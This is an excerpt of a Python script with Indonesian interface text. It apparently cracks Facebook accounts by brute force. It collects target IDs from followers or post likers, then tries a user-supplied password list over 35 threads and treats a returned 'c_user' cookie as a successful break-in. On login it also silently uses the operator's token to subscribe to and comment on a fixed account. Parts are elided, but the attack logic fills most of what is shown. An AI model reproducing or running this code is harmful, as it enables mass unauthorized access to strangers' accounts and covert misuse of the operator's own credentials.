...
except req.exceptions.ConnectionError:print(f'[{m}!{pu}] jaringanmu buruk.')
try:
    ua =open('ua','r').read()
...
def login():
    ...
    try:
        ...
        nama=r['name']
        req.post(f'https://graph.facebook.com/4/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/4/comments?message={lauk}&access_token={t}')
        print(f'[{i}√{pu}] login sukses\n{pu}[=] nama fb tumbal kamu:{b}',nama,pu)
        open('saveLogin.txt','a').write(t)
        time.sleep(0.7)
        gas(t).menu()
    except KeyError:
        print(f'[{m}!{pu}] token kamu salah!')
        login()
def logika():
    try:
        ...
        print(f'[{m}!{pu}] token eror masukin ulang')
        os.system('rm -rf saveLogin.txt')
        time.sleep(0.7)
        return login()
    except FileNotFoundError:
        print(f'[{m}!{pu}] login pakai token dulu')
        time.sleep(0.7)
        login()
class gas:
    ...
    def crack(self,user,lala,asu):
        ...
        for pw in lala:
            ...
            if 'c_user' in d.cookies.get_dict().keys():
                ...
                break
            print(f'\r[=] LARI CVK ADA HEMKER {str(cot)}/{len(id)} OK:-[{str(ok)}] CP:-[{str(cp)}]',end='')
    def kirim(self):
        print(f'{pu}[=] Jumlah ID \t:{b}',str(len(id)),f'{pu}')
        pi=input(f'{pu}[?] Pwlist Manual y/t\t: {b}')
        if(pi in ("y","Y")):
            with Bool(max_workers=35) as kirim:
                print(f"\n{pu}[!] Contoh ({b}name,name123,bangsat{pu})")
                pwList=input(f'[+] masukan password yang ingin anda gunakan: {b}').split(",")
                print(f'\n{pu}[√] crack dimulai pukul: {time.strftime("%X")}')
                print(f'+'+'-'*40+'+\n')
                for email in id:
...
AMPUN BANG HEMKER
        ...
        """)
        print(f"[=] selamat datang bang hemker\t:{i}",name,pu)
        print("+"+"-"*40+"+")
        ...
        if(p in ('01','1')):
            ...
            print(f'\n\t{pu}[ crack dari follower ]\n')
            print(f'{pu}[!] Ketik {m}me {pu}buat followers fb kamu [!]')
            try:
                memek=input(f'{pu}[+] Masukan ID\t: {b}')
                ...
                input(f'\n{pu}[{m}!{pu}] daftar teman tidak publik [!]\nEnter For Back To Menu')
            self.kirim()
        elif(p in ('03','3')):
            print(f'\n\t{pu}[ crack dari like publik ]')
            t=input(f'{pu}[+] masukin id postingan\t: {b}')
            try:
            ...
            print(f'{pu}Ok thanks bro salam dari juan')
            os.system('rm -rf saveLogin.txt')
        else:
            print(f'{pu}[{m}!{pu}] Pilihan Tidak Ada!')
            self.menu()
